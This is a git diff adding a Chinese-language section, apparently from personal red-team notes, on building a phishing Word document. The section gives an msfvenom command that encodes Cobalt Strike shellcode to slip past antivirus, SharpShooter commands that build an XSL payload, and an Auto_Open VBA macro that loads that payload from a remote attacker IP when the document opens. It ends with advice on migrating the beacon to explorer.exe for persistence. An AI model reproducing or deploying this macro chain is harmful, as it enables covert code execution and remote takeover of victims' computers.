@@ -831,6 +831,160 @@ End Type
 
 ---
 
+## VBA宏加载远程XSL
+
+> [加载远程XSL文件的宏免杀方法 · Uknow - Stay hungry Stay foolish (uknowsec.cn)](https://uknowsec.cn/posts/notes/加载远程XSL文件的宏免杀方法.html)
+>
+> [Macros and More with SharpShooter v2.0 - MDSec](https://www.mdsec.co.uk/2019/02/macros-and-more-with-sharpshooter-v2-0/)
+>
+> [GitHub - mdsecactivebreach/SharpShooter: Payload Generation Framework](https://github.com/mdsecactivebreach/SharpShooter)
+>
+> ---
+>
+> [针对Office宏病毒的高级检测-安全客 - 安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/267298)
+>
+> ---
+>
+> [Office钓鱼攻击绕过进程树检测 - 简书 (jianshu.com)](https://www.jianshu.com/p/8b01fca2c177)
+
+---
+
+### 利用方案
+
+#### 生成 Shellcode(Payload.bin)
+
+用 `CobaltStrike` 生成 Shellcode
+
+![image-20240704111814786](http://cdn.ayusummer233.top/DailyNotes/202407041118750.png)
+
+![image-20240704152434887](http://cdn.ayusummer233.top/DailyNotes/202407041524657.png)
+
+![image-20240704152857774](http://cdn.ayusummer233.top/DailyNotes/202407041528183.png)
+
+----
+
+#### 处理 payload.bin
+
+由于 `SharpShooter`要求shellcode中不能含有空字节, 所以要用 msfvenom 处理下生成的 payload.bin
+
+```bash
+msfvenom -p generic/custom PAYLOADFILE=./payload_raw_x86_131_80.bin -a x86 --platform windows -e x86/shikata_ga_nai -f raw -o shellcode-encoded.bin -b "\x00"
+```
+
+- `-p generic/custom`：指定使用自定义的 payload。
+
+- `PAYLOADFILE=./payload.bin`：指定自定义 payload 的文件路径，这里是当前目录下的 `payload.bin` 文件。
+
+- `-a x86`：指定目标架构为 x86（32 位）。
+
+- `--platform windows`：指定目标平台为 Windows。
+
+- `-e x86/shikata_ga_nai`：使用 `x86/shikata_ga_nai` 编码器对 payload 进行编码。
+
+  `shikata_ga_nai` 是一种多态编码器，能有效地混淆 payload，以绕过防病毒软件的检测。
+
+- `-f raw`：指定输出格式为原始二进制格式（raw）。
+
+- `-o shellcode-encoded.bin`：指定输出文件名为 `shellcode-encoded.bin`。
+
+- `-b "\x00"`：指定在编码过程中要避免的字节，这里是 `\x00`（空字节），通常为了防止字符串终止符影响 payload 的执行。
+
+---
+
+#### 生成 xsl 和 macro
+
+```bash
+# clone SharpShooter Repo
+git clone https://github.com/mdsecactivebreach/SharpShooter.git
+
+// 代理
+git clone https://ghproxy.org/https://github.com/mdsecactivebreach/SharpShooter.git
+
+cd SharpShooter
+virtualenv -p python2 ss2
+source ss2/bin/activate
+pip install -r requirements.txt
+
+# 生成 xsl 和 macro 文件
+python SharpShooter.py --stageless --dotnetver 2 --payload macro --output foo --rawscfile ../shellcode-encoded.bin --com xslremote --awlurl http://100.1.1.131:8000/download/foo.xsl
+
+```
+
+- –dotnetver：为目标的.net版本，可选2或者4
+- –awlurl： xsl存放地址
+
+![image-20240704174338316](http://cdn.ayusummer233.top/DailyNotes/202407041743965.png)
+
+---
+
+`foo.macro`: 创建一个 COM 对象加载远程 XSL
+
+```vb
+Sub Auto_Open()
+    Set XML = CreateObject("Microsoft.XMLDOM")
+    XML.async = False
+    Set xsl = XML
+    xsl.Load "http://100.1.1.131:8000/download/foo.xsl"
+    XML.transformNode xsl
+End Sub
+```
+
+![image-20240705100413007](http://cdn.ayusummer233.top/DailyNotes/202407051004339.png)
+
+`foo.xsl`中包含了处理后的 shellcode
+
+![image-20240704174925409](http://cdn.ayusummer233.top/DailyNotes/202407041749735.png)
+
+---
+
+1. 新建启用宏的 word 文档 `VBA_XMLDOM.docm`
+
+2. 在 Word 中编辑宏脚本(ALT+F11)
+
+3. 在“工程 – Project”窗口中，双击“Microsoft Word 对象”，再双击“ThisDocument”。
+
+4. 此时在右侧代码窗口顶部，会看到两个列表框，单击左侧下拉列表，将其从“（通用）”更改为“Document”，单击右侧下拉列表，从列表中选择“Close”或“Open”以插入 Document_Close()或 Document_Open()过程，或者可直接在代码窗口输入过程名。
+
+```vb
+Sub Auto_Open()
+    Set XML = CreateObject("Microsoft.XMLDOM")
+    XML.async = False
+    Set xsl = XML
+    xsl.Load "http://100.1.1.131:8000/download/foo.xsl"
+    XML.transformNode xsl
+End Sub
+Sub AutoOpen()
+    Auto_Open
+End Sub
+```
+
+保存然后重新打开这个 docm 文档
+
+![image-20240705103356923](http://cdn.ayusummer233.top/DailyNotes/202407051033298.png)
+
+![image-20240705103555605](http://cdn.ayusummer233.top/DailyNotes/202407051035870.png)
+
+---
+
+可以看到的是这样虽然可以上线, 但是 word 进程会崩, 如果结束 word 进程那么相应的 cs 也会掉线, 因此需要将上线目标迁移到其他进程上
+
+> [加载远程XSL文件的宏免杀方法 · Uknow - Stay hungry Stay foolish (uknowsec.cn)](https://uknowsec.cn/posts/notes/加载远程XSL文件的宏免杀方法.html)
+
+- Cobalt Strike：通过插件实现上线后自动迁移进程，[Beacon Handler Suite](https://github.com/threatexpress/aggressor-scripts/tree/d6bdbd587379d7da2a337d19cccdee1a8628d1d8/beacon_handler)
+- Metasploit: 在设置监听的时间可以设置：`set autorunscript migrate -N explorer.exe 或 set autorunscript -f`
+
+---
+
+
+
+
+
+
+
+
+
+---
+
 ## 相关链接
 
 - [钓鱼姿势汇总 - 简书 (jianshu.com)](https://www.jianshu.com/p/dcd250593698)
